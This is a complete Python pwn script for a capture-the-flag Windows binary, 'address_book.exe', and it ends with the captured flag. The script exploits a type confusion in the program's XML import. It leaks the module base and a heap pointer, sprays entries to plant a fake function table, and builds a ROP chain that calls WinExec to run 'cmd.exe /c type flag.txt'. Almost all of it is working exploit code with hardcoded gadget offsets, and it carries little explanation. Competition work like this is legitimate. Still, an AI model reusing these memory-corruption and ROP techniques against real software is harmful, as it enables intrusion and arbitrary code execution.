from ptrlib import *
from pwn import pause
from struct import unpack_from

import argparse

CMDLINE = ["./address_book.exe"]

pe = PE(CMDLINE[0])

class Exploit:
    LOCAL_HOST = "localhost"
    LOCAL_PORT = 1234
    REMOTE_HOST = "challenges.challenge-ecw.eu" 
    REMOTE_PORT = 1042

    PERSON_TYPE         = 1
    SHOP_TYPE           = 2
    HOSPITAL_TYPE       = 3
    POLICE_TYPE         = 4
    FIRE_TYPE           = 5
    ASSOCIATION_TYPE    = 6
    ATTRACTION_TYPE     = 7
    GARDEN_TYPE         = 8

    def __init__(self) -> None:
        self.parse()
        if self.args.remote:
            self.io = Socket(self.REMOTE_HOST, self.REMOTE_PORT)
        elif self.args.local:
            self.io = Socket(self.LOCAL_HOST, self.LOCAL_PORT)
        else:
            self.io = Process(CMDLINE)
            if self.args.debug:
                print(self.io.pid)
                pause()

    def parse(self):
        parser = argparse.ArgumentParser(prog="Exploit")

        parser.add_argument("-r", "--remote", action="store_true")
        parser.add_argument("-d", "--debug", action="store_true")
        parser.add_argument("-l", "--local", action="store_true")

        self.args = parser.parse_args()

    def new_entry_type(self, entry_type: int):
        self.io.sendlineafter(b"8. Exit\r\n", b'1')
        self.io.sendlineafter(b"8. Garden\r\n", str(entry_type).encode())

    def print_entry(self, name: bytes) -> bytes:
        self.io.sendlineafter(b"8. Exit\r\n", b'3')
        self.io.sendlineafter(b"Name ? ", name)
        return self.io.recvuntil(b"Choose an action", drop=True)
    
    def update_entry(self, name: bytes):
        self.io.sendlineafter(b"8. Exit\r\n", b'4')
        self.io.sendlineafter(b"Name ? ", name)
    
    def remove_entry(self, name: bytes):
        self.io.sendlineafter(b"8. Exit\r\n", b'5')
        self.io.sendlineafter(b"Name ? ", name)

    def export_to_xml(self):
        self.io.sendlineafter(b"8. Exit\r\n", b'6')

    def import_from_xml(self, xml_data: bytes):
        self.io.sendlineafter(b"8. Exit\r\n", b'7')
        self.io.sendlineafter(b"Enter xml:\r\n", xml_data)

    def new_person(self, name: bytes, address: bytes, phone: bytes):
        self.new_entry_type(self.PERSON_TYPE)
        self.io.sendlineafter(b"Name (first & last) ? ", name)
        self.io.sendlineafter(b"Address ? ", address)
        self.io.sendlineafter(b"Phone number ? ", phone)
    
    def new_shop(self, name: bytes, address: bytes, phone: bytes, open_time: bytes, business: bytes):
        self.new_entry_type(self.SHOP_TYPE)
        self.io.sendlineafter(b"Name ? ", name)
        self.io.sendlineafter(b"Address ? ", address)
        self.io.sendlineafter(b"Phone number ? ", phone)
        self.io.sendlineafter(b"Opening time ? ", open_time)
        self.io.sendlineafter(b"Business type ? ", business)
    
    def _assert_hospital(self, surface: int, bed_num: int, operating_room_num: int):
        assert surface <= 0x3500, "Max surface size for hospital is 0x3500"
        assert bed_num >= 15, "Min bed number is 15"
        assert bed_num <= 1000, "Max bed number is 1000"
        assert operating_room_num <= 6, "Max operating room is 6"

    def register_hospital(self, id: int, name: bytes, director: bytes, address: bytes,
                     phone: bytes, open_time: bytes, surface: int, bed_num: int,
                     emergency_bed_num: int, operating_room_num: int, awards: bytes,
                     cured: int, dead: int, lost: int):
        self._assert_hospital(surface, bed_num, operating_room_num)
        xml_data = b'<?xml version ="1.0" encoding="utf-8" ?>\n'
        xml_data += b"<register>"
        xml_data += b'<hospital id="' + str(id).encode() + b'">'
        xml_data += b"<name>" + name + b"</name>"
        xml_data += b"<director>" + director + b"</director>"
        xml_data += b"<address>" + address + b"</address>"
        xml_data += b"<phone>" + phone + b"</phone>"
        xml_data += b"<opening>" + open_time + b"</opening>"
        xml_data += b"<surface>" + str(surface).encode() + b"</surface>"
        xml_data += b"<total_bed>" + str(bed_num).encode() + b"</total_bed>"
        xml_data += b"<emergency_bed>" + str(emergency_bed_num).encode() + b"</emergency_bed>"
        xml_data += b"<operating_room>" + str(operating_room_num).encode() + b"</operating_room>"
        xml_data += b"<awards>" + awards + b"</awards>"
        xml_data += b"<cured>" + str(cured).encode() + b"</cured>"
        xml_data += b"<dead>" + str(dead).encode() + b"</dead>"
        xml_data += b"<lost>" + str(lost).encode() + b"</lost>"
        xml_data += b"</hospital>"
        xml_data += b"</register>"
        self.import_from_xml(xml_data=xml_data)

    def new_hospital(self, name: bytes, director: bytes, address: bytes,
                     phone: bytes, open_time: bytes, surface: int, bed_num: int,
                     emergency_bed_num: int, operating_room_num: int, awards: bytes,
                     cured: int, dead: int, lost: int):
        self._assert_hospital(surface, bed_num, operating_room_num)
        self.new_entry_type(self.HOSPITAL_TYPE)
        self.io.sendlineafter(b"Name ? ", name)
        self.io.sendlineafter(b"Director ? ", director)
        self.io.sendlineafter(b"Address ? ", address)
        self.io.sendlineafter(b"Phone number ? ", phone)
        self.io.sendlineafter(b"Opening time ? ", open_time)
        self.io.sendlineafter(b"Surface ? ", str(surface).encode())
        self.io.sendlineafter(b"Total bed ? ", str(bed_num).encode())
        self.io.sendlineafter(b"Nb emergency bed ? ", str(emergency_bed_num).encode())
        self.io.sendlineafter(b"Nb operating room ? ", str(operating_room_num).encode())
        self.io.sendlineafter(b"Awards ? ", awards)
        self.io.sendlineafter(b"Nb cured ? ", str(cured).encode())
        self.io.sendlineafter(b"Nb dead ? ", str(dead).encode())
        self.io.sendlineafter(b"Nb lost ? ", str(lost).encode())

    def _assert_attraction_park(self, surface: int, attraction_num: int):
        assert surface <= 0x6500, "Max surface size for attraction park is 0x6500"
        assert attraction_num >= 5, "Min attraction number is 5"
        assert attraction_num <= 112, "Max attraction number is 112"

    def register_attraction_park(self, id: int, name: bytes, director: bytes, address: bytes,
                            phone: bytes, open_time: bytes, surface: int, attraction_num: int):
        self._assert_attraction_park(surface, attraction_num)
        xml_data = b'<?xml version ="1.0" encoding="utf-8" ?>\n'
        xml_data += b'<register>'
        xml_data += b'<attraction_park id="' + str(id).encode() + b'">'
        xml_data += b"<name>" + name + b"</name>"
        xml_data += b"<director>" + director + b"</director>"
        xml_data += b"<address>" + address + b"</address>"
        xml_data += b"<phone>" + phone + b"</phone>"
        xml_data += b" <opening>" + open_time + b"</opening>"
        xml_data += b"<surface>" + str(surface).encode() + b"</surface>"
        xml_data += b"<nb_attraction>" + str(attraction_num).encode() + b"</nb_attraction>"
        xml_data += b"</attraction_park>"
        xml_data += b"</register>"
        self.import_from_xml(xml_data=xml_data)

    def new_attraction_park(self, name: bytes, director: bytes, address: bytes,
                            phone: bytes, open_time: bytes, surface: int, attraction_num: int):
        self._assert_attraction_park(surface, attraction_num)
        self.new_entry_type(self.ATTRACTION_TYPE)
        self.io.sendlineafter(b"Name ? ", name)
        self.io.sendlineafter(b"Director ? ", director)
        self.io.sendlineafter(b"Address ? ", address)
        self.io.sendlineafter(b"Phone number ? ", phone)
        self.io.sendlineafter(b"Opening time ? ", open_time)
        self.io.sendlineafter(b"Surface ? ", str(surface).encode())
        self.io.sendlineafter(b"Nb attractions ? ", str(attraction_num).encode())

    def update_attraction_park(self, old_name: bytes, name: bytes, director: bytes, address: bytes,
                            phone: bytes, open_time: bytes, surface: int, attraction_num: int, extra: bytes):
        self.update_entry(old_name)
        self.io.sendlineafter(b" ? ", name)
        self.io.sendlineafter(b" ? ", director)
        self.io.sendlineafter(b" ? ", address)
        self.io.sendlineafter(b" ? ", phone)
        self.io.sendlineafter(b" ? ", open_time)
        self.io.sendlineafter(b" ? ", str(surface).encode())
        self.io.sendlineafter(b" ? ", str(attraction_num).encode().ljust(8, b'\0') + extra)

    def update_police_station(self, old_name: bytes, name: bytes, address: bytes,
                            phone: bytes, open_time: bytes, police_man_num: bytes):
        #self.update_entry(old_name)
        self.io.sendlineafter(b" ? ", name)
        self.io.sendlineafter(b" ? ", address)
        self.io.sendlineafter(b" ? ", phone)
        self.io.sendlineafter(b" ? ", open_time)
        self.io.sendlineafter(b" ? ", police_man_num)

    def update_person(self, old_name: bytes, name: bytes, address: bytes, phone: bytes):
        self.update_entry(old_name)
        self.io.sendlineafter(b" ? ", name)
        self.io.sendlineafter(b" ? ", address)
        self.io.sendlineafter(b" ? ", phone)

    def get_hospital_leak(self, entry_output: bytes):
        entry_data = entry_output.replace(b" ", b"")
        low_word = entry_data.split(b"cured:")[1]
        low_word = int(low_word[:low_word.find(b"\r\n\t")])
        mid_word = entry_data.split(b"dead:")[1]
        mid_word = int(mid_word[:mid_word.find(b"\r\n\t")])
        high_word = entry_data.split(b"lost:")[1]
        high_word = int(high_word[:high_word.find(b"\r\n\t")])
        return (high_word << 0x20) | (mid_word << 0x10) | low_word

    def interactive(self):
        self.io.interactive()

    def close(self):
        self.io.close()

"""
RECAP:

Type confusion between Hospital (0x2975) and Attraction park (0x2795) when load with XML.
Attraction park is loaded with Hospital type so the entry is processed as an Hospital entry.
"""

io = Exploit()

if io.args.remote:
    pe.address = 0x7ff7e9d90000
else:
    pe.address = 0x7ff7f51c0000

stack_lift = pe.address + 0xbc88 # add rsp, 0x38 ; ret

for i in range(0x100):
    io.register_attraction_park(1, b'A'*0x8, b'B'*8, b'C'*0x44 + p64(stack_lift)[:6], b'D'*8, b'E'*8, 1, 5)
    entry_data = io.print_entry(b'A'*8)
    if len(entry_data):
        break

pe_addr = pe.address
pe.address = u64(entry_data[entry_data.find(b"Awards:              ") + len(b"Awards:              "):].split(b"\r\n\t")[0].ljust(8, b'\0')) << 0x10

assert pe_addr == pe.address, "[!] Update of pe.address needed %#x" % (pe.address)

print("pe_base      @ %#x" % pe.address)

SPRAY_SIZE = 0x28

# we spray person entries to get a person entry pointer under attraction entry confused
for i in range(SPRAY_SIZE):
    io.new_person(b'X'*0x20, b'B'*99, b'C'*15)

# we have a pointer to a person entry
person_entry = io.get_hospital_leak(io.print_entry(b'A'*8))
print("person_entry @ %#x" % person_entry)

ptr_fill = b""
ptr_fill += b'X'*8 + p64(person_entry + 0x20)
# person_entry + 0x20 points here
ptr_fill += p64(pe.address + 0x6370)
ptr_fill += p64(0x4242424242424242)
ptr_fill += p64(0x4343434343434343) + b"cmd.exe /c type flag.txt"

# we replace the content of all person entries with the fake manage_fns
for i in range(SPRAY_SIZE):
    io.update_person(b'X'*0x20, ptr_fill, b'B'*99, b'C'*15)

pop_rcx = lambda x : p64(pe.address + 0x2f8e) + p64(x) # pop rcx ; ret

GetCurrentProcessIdata = pe.address + 0xE008
getchar = pe.address + 0x1100
printf = pe.address + 0x1160

NO_LEAK = False

if NO_LEAK:
    rp = b''
    rp += b'A'*8
    rp += pop_rcx(GetCurrentProcessIdata)
    rp += p64(printf)
    rp += p64(getchar)
    rp += b'A'*8

    io.export_to_xml()

    io.update_police_station(b'A'*8, b'blank', b'blank', b'blank', b'blank', b'8'.ljust(8, b' ') + rp)

    io.io.recvuntil(b"\r\n")
    kernel32_GetCurrentProcess = u64(io.io.recv(8).ljust(8, b'\0'))

    print("GetCurrentProcess @ %#x" % kernel32_GetCurrentProcess)

    if io.args.remote:
        kernel32_base = kernel32_GetCurrentProcess - 0x23C80
    else:
        kernel32_base = kernel32_GetCurrentProcess - 0x24bc0

    print("kernel32_base     @ %#x" % kernel32_base)
else:
    if io.args.remote:
        kernel32_base = 0x7ff8583c0000
        WinExec = kernel32_base + 0x1280
    else:
        kernel32_base = 0x7ffda7510000
        WinExec = kernel32_base + 0x68820

    cmd_str = person_entry + 0x38

    rp = b''
    rp += b'A'*8
    rp += pop_rcx(cmd_str)
    rp += p64(WinExec)
    rp += b'A'*8

    # call police_station_update
    io.export_to_xml()

    io.update_police_station(b'A'*8, b'blank', b'blank', b'blank', b'blank', b'8'.ljust(8, b' ') + rp)

while True:
    print(io.io.recv(1024))


io.interactive()
io.close()

# ECW{1'M_S0_S0_C0NFUS3D_*-*}